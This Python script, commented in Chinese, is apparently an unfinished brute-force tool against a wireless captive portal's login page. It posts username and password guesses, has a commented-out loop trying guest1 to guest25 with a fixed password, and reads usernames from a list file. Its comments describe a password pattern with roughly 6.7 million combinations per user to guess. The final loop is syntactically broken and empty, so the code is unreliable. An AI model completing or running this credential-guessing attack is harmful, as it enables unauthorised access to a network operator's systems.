import urllib, urllib.request, urllib.parse, urllib.error

import re
import os

def request(us, pw):
    #构建POST表单数据
    postdata=urllib.parse.urlencode({
        'username': us,
        'password': pw,
        'submit':'Connect >> '
    })
    
    #请求地址
    address = 'http://wireless.colubris.com:8080/goform/HtmlLoginRequest'

    #生成http请求并发送
    req = urllib.request.Request(address,postdata.encode('utf-8'))
    result = urllib.request.urlopen(req, timeout=10).read()

    #检查返回页面
    decoded_result=result.decode('utf-8')
    if re.search('LOADING', decoded_result): 
        return True
    else:
        return False

#用户名生成(From autologin.py v4)
#default_username = "guest"
#password = "hostel"
#succ=False
#t = 0
#while(succ == False):
#    for i in range (1,26):
#        t+=1
#        username = default_username
#        username += str(i)
#        print(username, ", count",t,)
#        if request(username,password):
#            print("Log in success!" )
#            succ = True
#            break
#        else:
#            print("Log in failed...")

#读取用户名列表
f = open('list.txt')
lis = f.readlines()
succ = False
for i in range (0,len(lis)):
    if(i == len(lis)-1):
        name = lis[i]
    else:
        name = lis[i][0:len(lis[i])-1]
    while(succ == False)
    #密码计算
    #格式8位: 62/69 + C/B + 字母数字随机4位 + A
    #可能组合：6718464/user

f.close()
